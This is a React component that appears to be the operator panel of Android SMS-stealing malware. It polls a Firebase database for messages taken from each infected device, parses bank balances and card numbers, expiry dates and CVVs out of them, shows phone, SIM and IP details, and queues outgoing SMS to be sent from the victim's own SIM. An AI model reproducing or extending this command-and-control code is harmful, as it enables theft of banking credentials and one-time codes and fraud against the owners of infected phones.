import { useEffect, useState } from 'react'
import {
  X,
  Info,
  Landmark,
  CreditCard,
  MessageSquare,
  Send,
  Eye,
  EyeOff,
  Loader2,
  Phone,
  Cpu,
  HardDrive,
  Globe,
  CardSim,
} from 'lucide-react'
import type { BankEntry, CardEntry, DetailTab, Device, SmsEntry } from '../lib/types'
import { fetchPath, setPath } from '../lib/firebase'
import {
  detectSmsType,
  formatCurrency,
  parseBankFromSms,
  parseCardFromSms,
  relativeTime,
} from '../lib/parse'

interface Props {
  device: Device | null
  baseUrl: string
  dbKey: string
  open: boolean
  onClose: () => void
  pushToast: (t: { type: 'success' | 'error' | 'info' | 'warn'; title: string; message?: string }) => void
}

const TABS: { id: DetailTab; label: string; icon: typeof Info }[] = [
  { id: 'info', label: 'Info', icon: Info },
  { id: 'bank', label: 'Bank', icon: Landmark },
  { id: 'card', label: 'Card', icon: CreditCard },
  { id: 'sms', label: 'SMS', icon: MessageSquare },
  { id: 'send', label: 'Send', icon: Send },
]

export function DeviceDrawer({ device, baseUrl, dbKey, open, onClose, pushToast }: Props) {
  const [tab, setTab] = useState<DetailTab>('info')
  const [sms, setSms] = useState<SmsEntry[]>([])
  const [banks, setBanks] = useState<BankEntry[]>([])
  const [cards, setCards] = useState<CardEntry[]>([])
  const [loadingSms, setLoadingSms] = useState(false)
  const [showCvv, setShowCvv] = useState(false)
  const [sim, setSim] = useState<1 | 2>(1)
  const [to, setTo] = useState('')
  const [body, setBody] = useState('')
  const [sending, setSending] = useState(false)

  useEffect(() => {
    if (!device || !open) return
    setTab('info')
    setShowCvv(false)
    loadSms()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [device?.id, open])

  useEffect(() => {
    if (!device || !open || tab !== 'sms') return
    const id = setInterval(loadSms, 6000)
    return () => clearInterval(id)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [device?.id, open, tab])

  async function loadSms() {
    if (!device) return
    setLoadingSms(true)
    try {
      // common paths used by such agents: sms, messages, smsList
      const raw =
        (await fetchPath<Record<string, unknown>>(baseUrl, `clients/${device.id}/sms`, dbKey)) ||
        (await fetchPath<Record<string, unknown>>(baseUrl, `clients/${device.id}/messages`, dbKey)) ||
        {}

      const entries: SmsEntry[] = Object.entries(raw)
        .map(([id, v]) => {
          const o = (v || {}) as Record<string, unknown>
          const body = String(o.body || o.message || o.msg || o.text || '')
          const ts = Number(o.timestamp || o.time || o.date || Date.now())
          const address = o.address ? String(o.address) : o.sender ? String(o.sender) : undefined
          return {
            id,
            body,
            address,
            timestamp: ts,
            type: detectSmsType(body),
            sim: o.sim ? Number(o.sim) : undefined,
          }
        })
        .filter((s) => s.body)
        .sort((a, b) => b.timestamp - a.timestamp)
        .slice(0, 60)

      setSms(entries)

      const bankList = entries
        .filter((s) => s.type === 'bank')
        .map((s) => parseBankFromSms(s.body, s.id, s.timestamp, s.address))
      setBanks(bankList)

      const cardList = entries
        .filter((s) => s.type === 'card')
        .map((s) => parseCardFromSms(s.body, s.id, s.timestamp))
      setCards(cardList)
    } catch {
      /* silent on refresh */
    } finally {
      setLoadingSms(false)
    }
  }

  async function handleSend(e: React.FormEvent) {
    e.preventDefault()
    if (!device || !to.trim() || !body.trim()) return
    setSending(true)
    try {
      await setPath(baseUrl, `clients/${device.id}/webhookEvent/sendSms`, dbKey, {
        sim,
        number: to.trim(),
        message: body.trim(),
        timestamp: Date.now(),
      })
      pushToast({ type: 'success', title: 'SMS queued', message: `Via SIM ${sim} → ${to.trim()}` })
      setBody('')
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Failed'
      pushToast({
        type: 'error',
        title: msg === 'PERMISSION_DENIED' ? 'Permission denied' : 'Send failed',
        message: msg === 'PERMISSION_DENIED' ? 'Database secret required for writes.' : msg,
      })
    } finally {
      setSending(false)
    }
  }

  if (!open || !device) return null

  return (
    <>
      {/* backdrop */}
      <div
        className="fixed inset-0 z-40 bg-slate-950/60 backdrop-blur-sm"
        onClick={onClose}
        aria-hidden
      />

      {/* panel */}
      <aside
        className="fixed inset-y-0 right-0 z-50 w-full max-w-lg bg-slate-950 border-l border-slate-800 shadow-2xl flex flex-col animate-[toast-in_0.2s_ease-out]"
        role="dialog"
        aria-label="Device details"
      >
        {/* header */}
        <div className="flex items-start justify-between gap-3 border-b border-slate-800 px-5 py-4">
          <div className="min-w-0">
            <h2 className="text-lg font-semibold text-white truncate">
              {device.name || device.model || device.id}
            </h2>
            <p className="text-xs text-slate-500 font-mono truncate mt-0.5">{device.id}</p>
          </div>
          <button
            onClick={onClose}
            className="rounded-lg p-2 text-slate-400 hover:bg-slate-800 hover:text-white transition"
            aria-label="Close"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* tabs */}
        <div className="flex border-b border-slate-800 px-2 overflow-x-auto">
          {TABS.map((t) => {
            const Icon = t.icon
            const active = tab === t.id
            return (
              <button
                key={t.id}
                onClick={() => setTab(t.id)}
                className={`flex items-center gap-1.5 px-3 py-3 text-xs font-medium border-b-2 transition whitespace-nowrap ${
                  active
                    ? 'border-sky-400 text-sky-300'
                    : 'border-transparent text-slate-500 hover:text-slate-300'
                }`}
              >
                <Icon className="h-3.5 w-3.5" />
                {t.label}
              </button>
            )
          })}
        </div>

        {/* body */}
        <div className="flex-1 overflow-y-auto p-5">
          {tab === 'info' && (
            <div className="space-y-3">
              <InfoRow icon={Phone} label="Phone" value={device.phone} />
              <InfoRow icon={CardSim} label="Network" value={device.network} />
              <InfoRow icon={Cpu} label="Android / SDK" value={[device.androidVersion, device.sdk].filter(Boolean).join(' · ')} />
              <InfoRow icon={Globe} label="IP" value={device.ip} />
              <InfoRow icon={HardDrive} label="Storage" value={device.storage} />
              <InfoRow icon={Cpu} label="CPU" value={device.cpu} />
              <InfoRow icon={CardSim} label="SIM 1" value={device.sim1} />
              <InfoRow icon={CardSim} label="SIM 2" value={device.sim2} />
              <InfoRow icon={Info} label="Last seen" value={relativeTime(device.lastSeen)} />
              <InfoRow icon={Info} label="Battery" value={device.battery != null ? `${device.battery}%${device.isCharging ? ' · charging' : ''}` : undefined} />
            </div>
          )}

          {tab === 'bank' && (
            <div className="space-y-3">
              {banks.length === 0 && (
                <Empty label="No bank SMS parsed yet" sub="Messages matching bank patterns will appear here." />
              )}
              {banks.map((b) => (
                <div key={b.id} className="rounded-xl border border-emerald-500/20 bg-emerald-950/20 p-3.5">
                  <div className="flex items-center justify-between gap-2">
                    <p className="text-sm font-semibold text-emerald-200">{b.bankName}</p>
                    <span
                      className={`text-[10px] font-semibold uppercase px-1.5 py-0.5 rounded ${
                        b.type === 'credit'
                          ? 'bg-emerald-500/20 text-emerald-300'
                          : b.type === 'debit'
                            ? 'bg-rose-500/20 text-rose-300'
                            : 'bg-slate-700 text-slate-300'
                      }`}
                    >
                      {b.type}
                    </span>
                  </div>
                  <div className="mt-2 flex flex-wrap gap-x-4 gap-y-1 text-xs text-slate-400">
                    {b.balance && <span>Bal: <span className="text-emerald-300 font-medium tabular-nums">{formatCurrency(b.balance)}</span></span>}
                    {b.amount && <span>Amt: <span className="text-slate-200 tabular-nums">{formatCurrency(b.amount)}</span></span>}
                    {b.accountLast4 && <span>A/c ••{b.accountLast4}</span>}
                    {b.sender && <span className="truncate max-w-[120px]">{b.sender}</span>}
                  </div>
                  <p className="mt-2 text-[11px] text-slate-500 leading-relaxed line-clamp-3">{b.body}</p>
                  <p className="mt-1 text-[10px] text-slate-600">{relativeTime(b.timestamp)}</p>
                </div>
              ))}
            </div>
          )}

          {tab === 'card' && (
            <div className="space-y-3">
              {cards.length === 0 && (
                <Empty label="No card data found" sub="SMS containing card last4 / CVV / expiry will show here." />
              )}
              {cards.map((c) => (
                <div key={c.id} className="rounded-xl border border-fuchsia-500/20 bg-fuchsia-950/20 p-3.5">
                  <div className="flex items-center justify-between">
                    <p className="text-sm font-semibold text-fuchsia-200">{c.type} ••{c.last4}</p>
                    <button
                      onClick={() => setShowCvv((v) => !v)}
                      className="text-slate-500 hover:text-slate-300 p-1"
                      aria-label="Toggle CVV"
                    >
                      {showCvv ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                  <div className="mt-2 flex flex-wrap gap-x-4 gap-y-1 text-xs text-slate-400">
                    {c.expiry && <span>Exp {c.expiry}</span>}
                    {c.cvv && (
                      <span>
                        CVV{' '}
                        <span className="font-mono text-fuchsia-200">
                          {showCvv ? c.cvv : '•••'}
                        </span>
                      </span>
                    )}
                  </div>
                  <p className="mt-2 text-[11px] text-slate-500 leading-relaxed line-clamp-3">{c.body}</p>
                  <p className="mt-1 text-[10px] text-slate-600">{relativeTime(c.timestamp)}</p>
                </div>
              ))}
            </div>
          )}

          {tab === 'sms' && (
            <div className="space-y-2">
              <div className="flex items-center justify-between mb-2">
                <p className="text-xs text-slate-500">Last ~60 messages · auto every 6s</p>
                {loadingSms && <Loader2 className="h-3.5 w-3.5 animate-spin text-slate-500" />}
              </div>
              {sms.length === 0 && !loadingSms && (
                <Empty label="No SMS yet" sub="Incoming messages from this device will list here." />
              )}
              {sms.map((s) => (
                <div
                  key={s.id}
                  className={`rounded-xl border px-3 py-2.5 ${
                    s.type === 'bank'
                      ? 'border-emerald-500/25 bg-emerald-950/15'
                      : s.type === 'card'
                        ? 'border-fuchsia-500/25 bg-fuchsia-950/15'
                        : 'border-rose-500/20 bg-rose-950/10'
                  }`}
                >
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <span
                      className={`text-[10px] font-semibold uppercase ${
                        s.type === 'bank'
                          ? 'text-emerald-400'
                          : s.type === 'card'
                            ? 'text-fuchsia-400'
                            : 'text-rose-400'
                      }`}
                    >
                      {s.type}
                    </span>
                    <span className="text-[10px] text-slate-600">{relativeTime(s.timestamp)}</span>
                  </div>
                  {s.address && <p className="text-[11px] text-slate-400 mb-0.5">{s.address}</p>}
                  <p className="text-xs text-slate-200 leading-relaxed whitespace-pre-wrap break-words">{s.body}</p>
                </div>
              ))}
            </div>
          )}

          {tab === 'send' && (
            <form onSubmit={handleSend} className="space-y-4">
              <div>
                <p className="text-xs font-medium text-slate-400 mb-2">SIM slot</p>
                <div className="flex gap-2">
                  {[1, 2].map((n) => (
                    <button
                      key={n}
                      type="button"
                      onClick={() => setSim(n as 1 | 2)}
                      className={`flex-1 rounded-xl border py-2.5 text-sm font-medium transition ${
                        sim === n
                          ? 'border-sky-500 bg-sky-500/15 text-sky-300'
                          : 'border-slate-700 bg-slate-900 text-slate-400 hover:border-slate-600'
                      }`}
                    >
                      SIM {n}
                    </button>
                  ))}
                </div>
              </div>
              <label className="block">
                <span className="text-xs font-medium text-slate-400 mb-1.5 block">Recipient</span>
                <input
                  value={to}
                  onChange={(e) => setTo(e.target.value)}
                  placeholder="+91…"
                  className="w-full rounded-xl border border-slate-700 bg-slate-900 px-3.5 py-2.5 text-sm text-slate-100 placeholder:text-slate-600 focus:border-sky-500/60 focus:ring-1 focus:ring-sky-500/40"
                />
              </label>
              <label className="block">
                <span className="text-xs font-medium text-slate-400 mb-1.5 block">Message</span>
                <textarea
                  value={body}
                  onChange={(e) => setBody(e.target.value)}
                  rows={4}
                  placeholder="Type message…"
                  className="w-full rounded-xl border border-slate-700 bg-slate-900 px-3.5 py-2.5 text-sm text-slate-100 placeholder:text-slate-600 focus:border-sky-500/60 focus:ring-1 focus:ring-sky-500/40 resize-none"
                />
              </label>
              <button
                type="submit"
                disabled={sending || !to.trim() || !body.trim()}
                className="w-full inline-flex items-center justify-center gap-2 rounded-xl bg-sky-500 hover:bg-sky-400 disabled:opacity-50 text-slate-950 font-semibold text-sm py-2.5 transition"
              >
                {sending ? <Loader2 className="h-4 w-4 animate-spin" /> : <Send className="h-4 w-4" />}
                Queue SMS
              </button>
              <p className="text-[11px] text-slate-600">
                Writes to <code className="text-slate-400">clients/{'{id}'}/webhookEvent/sendSms</code>
              </p>
            </form>
          )}
        </div>
      </aside>
    </>
  )
}

function InfoRow({
  icon: Icon,
  label,
  value,
}: {
  icon: typeof Info
  label: string
  value?: string
}) {
  return (
    <div className="flex items-start gap-3 rounded-xl border border-slate-800 bg-slate-900/50 px-3.5 py-3">
      <Icon className="h-4 w-4 text-slate-500 mt-0.5 shrink-0" />
      <div className="min-w-0">
        <p className="text-[11px] text-slate-500 uppercase tracking-wide">{label}</p>
        <p className="text-sm text-slate-200 mt-0.5 break-all">{value || '—'}</p>
      </div>
    </div>
  )
}

function Empty({ label, sub }: { label: string; sub?: string }) {
  return (
    <div className="rounded-xl border border-dashed border-slate-800 bg-slate-900/30 px-6 py-10 text-center">
      <p className="text-sm text-slate-400">{label}</p>
      {sub && <p className="mt-1 text-xs text-slate-600">{sub}</p>}
    </div>
  )
}
